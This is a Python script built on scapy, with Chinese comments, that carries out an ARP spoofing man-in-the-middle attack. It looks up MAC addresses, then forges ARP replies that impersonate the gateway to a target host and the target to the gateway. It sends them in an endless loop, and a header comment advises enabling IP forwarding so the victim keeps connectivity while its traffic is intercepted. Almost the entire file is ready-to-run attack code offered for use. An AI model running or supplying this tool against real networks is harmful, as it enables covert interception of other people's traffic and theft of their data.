"""
注意此攻击脚本，如果允许目标主机能够上网，需要开启本地的路由转发功能
可以通过iptables或者firewalld开启转发
https://www.xsy.me/linux/system/proxy-forward.html
"""
from scapy.all import *
# ARP用来构建ARP数据报
# Ether用来构建以太网数据
# sendp方法在第二层发送数据包
# getmacbyip通过ip获取mac地址
# get_if_hwaddr方法获取指定网卡的Mac地址
from scapy.layers.l2 import getmacbyip
import time
import argparse
import threading


def get_mac(target_ip):
    """
    根据ip地址获取其mac地址
    :param target_ip:
    :return:
    """
    target_ip = target_ip.strip('/24')
    # 创建arp数据包，参数是目标主机，注意这里，如果填写了'/24'掩码，那么会扫描全局域网的范围，获取所有在线ip的地址
    # 如果填写单个不带掩码的Ip，获取到的就是单个ip的Mac地址
    # ARP函数在windows环境可能不支持，linux环境支持
    arp = ARP(pdst=target_ip)
    # 创建以太网广播包
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    # 组装完整的数据报
    arp_packet = ether/arp
    # 使用srp()函数，转发2层数据报，设置超时为2
    # 这个函数会返回一个元组，包含两种数据，但是我们只需要返回元组中的第一个结果即可
    # 类似这样的返回结果(<Results: TCP:0 UDP:0 ICMP:0 Other:1>, <Unanswered: TCP:0 UDP:0 ICMP:0 Other:0>)
    # 我们只需要元组第一个元素<Results: TCP:0 UDP:0 ICMP:0 Other:1>，包含发送数据报和一个或多个接收数据包,格式是（sent_packet,received_packet）
    # 通过字典遍历法遍历获取数据
    result = srp(arp_packet, timeout=2, verbose=False)[0]
    client = dict()
    for send, receieved in result:
        # 获取接收到数据报中的源地址和源mac地址
        client[receieved.psrc] = receieved.hwsrc
    return client[target_ip]


def create_arp_station(src_mac, target_mac, gateway_ip, target_ip):
    """
    生成ARP数据包，伪造成网关欺骗目标计算机
    :param src_mac: 本机的MAC地址，充当中间人
    :param target_mac: 目标计算机的MAC
    :param gateway_ip: 网关的Ip，将发往网关的数据指向本机（中间人），形成ARP攻击
    :param target_ip: 目标计算机的IP
    :return: 数据报
    """
    # Eth层数据，伪造数据报的源mac和目的mac
    eth = Ether(src=src_mac, dst=target_mac)
    # ARP层数据，伪造数据报的源mac（攻击机mac）和网关Ip+目的机mac和Ip，op="is-at"表示ARP响应
    arp = ARP(hwsrc=src_mac, psrc=gateway_ip, hwdst=target_mac, pdst=target_ip, op="is-at")
    pkt = eth/arp
    return pkt


def create_arp_gateway(src_mac, gateway_mac, target_ip, gateway_ip):
    """
    生成ARP数据包，伪造成目标计算机欺骗网关
    :param src_mac: 攻击机的Mac地址，充当中间人
    :param gateway_mac: 网关的Mac
    :param target_ip: 目标计算机的ip,将网关发送目标计算机的数据指向攻击机
    :param gateway_ip: 网关的ip
    :return: 数据报
    """
    eth = Ether(src=src_mac, dst=gateway_mac)
    arp = ARP(hwsrc=src_mac, psrc=target_ip, hwdst=gateway_mac, pdst=gateway_ip)
    pkt = eth/arp
    return pkt


def main():
    parser = argparse.ArgumentParser(description="ARP攻击脚本")
    parser.add_argument('-sm', dest='srcmac', type=str, help='攻击机的MAC，如果不提供，默认将采用本机的MAC地址')
    parser.add_argument('-t', dest='targetip', type=str, help='目标计算机IP', required=True)
    parser.add_argument('-tm', dest='targetmac', type=str, help='目标计算机MAC，如果不提供，默认将根据其IP获取MAC地址')
    parser.add_argument('-g', dest='gatewayip', type=str, help='指定网关IP', required=True)
    parser.add_argument('-gm', dest='gatewaymac', type=str, help='指定网关MAC，如果不提供，默认将根据其IP获取MAC地址')
    parser.add_argument('-i', dest='interface', type=str, help='指定使用的网卡', required=True)
    parser.add_argument('-a', dest='allarp', action='store_true', help='是否进行全网arp欺骗')
    args = parser.parse_args()

    target_ip = args.targetip
    gateway_ip = args.gatewayip
    interface = args.interface
    src_mac = args.srcmac
    target_mac = args.targetmac
    gateway_mac = args.gatewaymac

    # 如果未按规定指定参数，提示退出
    if target_ip is None or gateway_ip is None or interface is None:
        raise SystemExit(parser.print_help())
    # 如果未指定源mac,网关mac,目标mac,通过函数获取
    if src_mac is None:
        src_mac = get_if_hwaddr(interface)
    if target_mac is None:
        target_mac = get_mac(target_ip)
    if gateway_mac is None:
        gateway_mac = get_mac(gateway_ip)

    print("本机Mac地址是:{0}".format(src_mac))
    print("本机攻击接口是:{0}".format(interface))
    print("目标机器IP地址是:{0}".format(target_ip))
    print("目标机器Mac地址是:{0}".format(target_mac))
    print("网关IP地址是:{0}".format(gateway_ip))
    print("网关Mac地址是:{0}".format(gateway_mac))

    a = input('是否确认: Y/N：')
    if a.lower() == 'n':
        raise SystemExit("重新执行！")


    # 创建欺骗目标主机的数据报
    pkt_station = create_arp_station(src_mac, target_mac, gateway_ip, target_ip)
    # 创建欺骗网关的数据报
    pkt_gateway = create_arp_gateway(src_mac, gateway_mac, target_ip, gateway_ip)

    # sendp(pkt_station, inter=1, loop=1)
    # sendp(pkt_station, inter=1, loop=1)

    i = 1
    # 死循环展示发送的情况
    while True:
        t = threading.Thread(target=sendp,
                             args=(pkt_station,),
                             kwargs={'inter': 1, 'iface': interface})
        t.start()
        t.join()
        print(str(i)+ "[*]发送一个计算机的ARP欺骗包")
        s = threading.Thread(target=sendp,
                             args=(pkt_gateway,),
                             kwargs={'inter': 1, 'iface': interface})
        s.start()
        s.join()
        print(str(i) + "[*]发送一个网关的ARP欺骗包")
        i += 1
        time.sleep(1)


if __name__ == '__main__':
    main()